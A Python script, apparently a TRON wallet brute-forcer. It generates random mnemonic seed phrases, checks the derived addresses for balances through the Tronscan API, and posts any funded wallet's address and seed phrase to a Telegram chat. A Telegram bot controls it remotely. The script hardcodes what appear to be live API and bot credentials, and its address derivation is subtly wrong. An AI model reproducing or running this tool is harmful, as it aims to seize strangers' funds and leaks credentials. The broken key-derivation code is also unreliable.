import requests
from mnemonic import Mnemonic
import hashlib
import base58
import time
import threading
import sys
import signal
from concurrent.futures import ThreadPoolExecutor

# === CONFIG ===
TELEGRAM_BOT_TOKEN = "8288543165:AAE2QnuOZFprB5XQ-h-ELCnt-y8kLv9OAqE"
TELEGRAM_CHAT_ID = "7573992508"
TRONSCAN_API_KEY = "1f97bd4d-ef64-4e66-9790-51c2e558251d"

mnemo = Mnemonic("english")
running = False
last_update_id = 0
stop_event = threading.Event()

# === Generate TRON Address ===
def seed_to_tron_address(seed):
    try:
        priv = hashlib.pbkdf2_hmac("sha512", b"Bitcoin seed", seed, 2048)[:32]
        h1 = hashlib.sha256(priv).digest()
        h2 = hashlib.new('ripemd160', h1).digest()
        payload = b'\x41' + h2
        checksum = hashlib.sha256(hashlib.sha256(payload).digest()).digest()[:4]
        return base58.b58encode(payload + checksum).decode()
    except:
        return None

# === Check Balance ===
def check_balance_single(addr):
    for _ in range(3):
        try:
            r = requests.get(
                f"https://apilist.tronscan.org/api/account?address={addr}",
                headers={"TRON-PRO-API-KEY": TRONSCAN_API_KEY},
                timeout=15
            ).json()
            return addr, float(r.get("balance", 0)) / 1_000_000
        except:
            time.sleep(2)
    return addr, 0.0

# === Send to Telegram (تلاش دوباره) ===
def send_telegram(text):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    data = {"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "Markdown"}
    for _ in range(5):
        try:
            requests.post(url, json=data, timeout=20)
            return True
        except Exception as e:
            print(f"Telegram send error: {e} (retrying...)")
            time.sleep(3)
    return False

# === Scanner (توقف خودکار) ===
def scanner():
    global running
    total = 0
    found = 0
    send_telegram("*TRON Scanner Started on Host*")
    
    while running and not stop_event.is_set():
        wallets = []
        for _ in range(50):
            if not running or stop_event.is_set(): break
            phrase = mnemo.generate(128)
            seed = mnemo.to_seed(phrase)
            addr = seed_to_tron_address(seed)
            if addr:
                wallets.append((addr, phrase))
        
        if not wallets: continue
        total += len(wallets)

        start_time = time.time()
        results = []
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(check_balance_single, addr) for addr, _ in wallets]
            for f in futures:
                if not running or stop_event.is_set(): break
                results.append(f.result())
        elapsed = time.time() - start_time

        total_balance = sum(bal for _, bal in results)
        print(f"[{total:07d}] Batch: {elapsed:.2f}s | Total Balance: {total_balance:.6f} TRX")
        sys.stdout.flush()

        # والت با موجودی → توقف + نمایش
        for (addr, phrase), (r_addr, bal) in zip(wallets, results):
            if bal > 0:
                found += 1
                msg = f"""
*TRON WALLET FOUND!* #{found}
*Address:* `{addr}`
*Balance:* `{bal:.6f} TRX`
*Seed (12 words):*
`{phrase}`
"""
                print("\n" + "="*60)
                print(msg.strip())
                print("="*60 + "\n")
                send_telegram(msg.strip())
                
                # توقف کامل
                running = False
                stop_event.set()
                send_telegram("*SCAN STOPPED AUTOMATICALLY* - Seed sent above")
                print("SCAN STOPPED. Exiting in 3 seconds...")
                time.sleep(3)
                sys.exit(0)

        time.sleep(0.1)

# === Telegram Bot (فقط متن) ===
def telegram_bot():
    global running, last_update_id
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
    
    while not stop_event.is_set():
        try:
            r = requests.get(url, params={"offset": last_update_id + 1, "timeout": 30}, timeout=20).json()
            for update in r.get("result", []):
                if stop_event.is_set(): break
                last_update_id = update["update_id"]

                if "message" not in update: continue
                msg = update["message"].get("text", "").strip().lower()
                chat_id = update["message"]["chat"]["id"]
                if str(chat_id) != TELEGRAM_CHAT_ID: continue

                if msg in ["/start", "start"]:
                    if not running:
                        running = True
                        send_telegram("*Scan started on host*")
                    else:
                        send_telegram("Already running")

                elif msg in ["/stop", "stop"]:
                    if running:
                        running = False
                        send_telegram("*Scan stopped*")
                    else:
                        send_telegram("Not running")

                elif msg in ["/status", "status"]:
                    status = "Running" if running else "Stopped"
                    send_telegram(f"*Status:* {status}")

        except Exception as e:
            print(f"Telegram update error: {e}")
            time.sleep(5)

# === Manual Control (Ctrl+C) ===
def handle_signal(signum, frame):
    global running
    print("\n\nManual Control:")
    print("  s = Start scan")
    print("  x = Stop scan")
    print("  q = Quit")
    cmd = input("> ").strip().lower()
    if cmd == "s":
        running = True
        print("Started")
    elif cmd == "x":
        running = False
        print("Stopped")
    elif cmd == "q":
        print("Shutting down...")
        stop_event.set()
        send_telegram("*Scanner stopped by user*")
        time.sleep(2)
        sys.exit(0)

# === Main ===
if __name__ == "__main__":
    signal.signal(signal.SIGINT, handle_signal)
    print("TRON SCANNER - HOST MODE + TELEGRAM")
    print("Use /start in Telegram to begin")
    
    t1 = threading.Thread(target=scanner, daemon=True)
    t1.start()
    t2 = threading.Thread(target=telegram_bot, daemon=True)
    t2.start()
    
    send_telegram("*Host connected* - Send `/start` to begin scanning")
    
    try:
        while not stop_event.is_set():
            time.sleep(1)
    except:
        send_telegram("Scanner crashed")
